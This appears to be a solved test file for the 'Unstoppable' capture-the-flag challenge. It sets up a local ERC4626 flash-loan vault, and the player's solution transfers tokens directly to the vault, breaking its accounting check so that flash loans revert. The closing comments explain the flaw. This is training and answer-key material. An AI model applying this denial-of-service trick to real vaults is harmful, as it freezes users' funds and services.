const { ethers } = require('hardhat')
const { expect } = require('chai')

describe('[Challenge] Unstoppable', function () {
  let deployer, player, someUser
  let token, vault, receiverContract

  const TOKENS_IN_VAULT = 1000000n * 10n ** 18n
  const INITIAL_PLAYER_TOKEN_BALANCE = 10n * 10n ** 18n

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */

    ;[deployer, player, someUser] = await ethers.getSigners()

    token = await (
      await ethers.getContractFactory('DamnValuableToken', deployer)
    ).deploy()
    vault = await (
      await ethers.getContractFactory('UnstoppableVault', deployer)
    ).deploy(
      token.address,
      deployer.address, // owner
      deployer.address // fee recipient
    )
    expect(await vault.asset()).to.eq(token.address)

    await token.approve(vault.address, TOKENS_IN_VAULT)
    await vault.deposit(TOKENS_IN_VAULT, deployer.address)

    expect(await token.balanceOf(vault.address)).to.eq(TOKENS_IN_VAULT)
    expect(await vault.totalAssets()).to.eq(TOKENS_IN_VAULT)
    expect(await vault.totalSupply()).to.eq(TOKENS_IN_VAULT)
    expect(await vault.maxFlashLoan(token.address)).to.eq(TOKENS_IN_VAULT)
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT - 1n)).to.eq(0)
    expect(await vault.flashFee(token.address, TOKENS_IN_VAULT)).to.eq(
      50000n * 10n ** 18n
    )

    await token.transfer(player.address, INITIAL_PLAYER_TOKEN_BALANCE)
    expect(await token.balanceOf(player.address)).to.eq(
      INITIAL_PLAYER_TOKEN_BALANCE
    )

    // Show it's possible for someUser to take out a flash loan
    receiverContract = await (
      await ethers.getContractFactory('ReceiverUnstoppable', someUser)
    ).deploy(vault.address)
    await receiverContract.executeFlashLoan(100n * 10n ** 18n)
  })

  it('Execution', async function () {
    /** CODE YOUR SOLUTION HERE */

    // it is no longer possible to execute flash
    await token
      .connect(player)
      .transfer(vault.address, ethers.utils.parseEther('1'))
  })

  after(async function () {
    /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

    // It is no longer possible to execute flash loans
    await expect(
      receiverContract.executeFlashLoan(100n * 10n ** 18n)
    ).to.be.reverted
  })
})

// ERC4626 proposes a standard for tokenized vault with functionalities to track shares of user deposits in the vault,
// usually to determine the rewards to distribute for a given user who staked their tokens in the vault.

// In this case, the asset is the underlying token that user deposit/withdraw into the vault.
// And the share is the amount of vault tokens that the vault mint/burn for users to represent their deposited assets.
// In this challenge, the underlying token is 'DVT', and the vault token is deployed as 'oDVT'.

// Based on ERC4626, convertToShares() function takes input of an amount of assets('DVT'), and calculates the amount of share('oDVT') the vault should mint,
// based on the ratio of user's deposited assets. Now we are able to see two issues here.

// (1) (convertToShares(totalSupply) != balanceBefore) enforces the condition where totalSupply of the vault tokens should always equal totalAsset of underlying tokens before any flash loan execution.
// If there are other implementations of the vault that divert asset tokens to other contracts, the flashLoan function would be inactive.

// (2) totalAssets function is overridden to return always the balance of the vault contract asset.balanceOf(address(this)).
// And this is a separate system of accounting implemented through tracking supply of vault tokens.

// The attack is to create a conflict between the two accounting systems by manually transferring 'DVT' to the vault.
